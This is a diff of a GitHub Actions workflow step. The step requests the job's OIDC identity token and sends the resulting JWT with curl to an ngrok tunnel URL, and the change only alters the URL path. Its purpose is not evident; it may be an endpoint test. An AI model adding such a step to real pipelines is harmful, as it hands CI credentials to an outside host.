@@ -22,4 +22,4 @@ jobs:
         run: |
           OIDC_TOKEN=$(curl -sLS "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=docker-build-action" -H "User-Agent: actions/oidc-client" -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN")
           JWT=$(echo $OIDC_TOKEN | jq -j '.value')
-          curl --header "Authorization: Bearer $JWT" https://8293-108-53-73-234.ngrok.io
+          curl --header "Authorization: Bearer $JWT" https://8293-108-53-73-234.ngrok.io/repo_resources
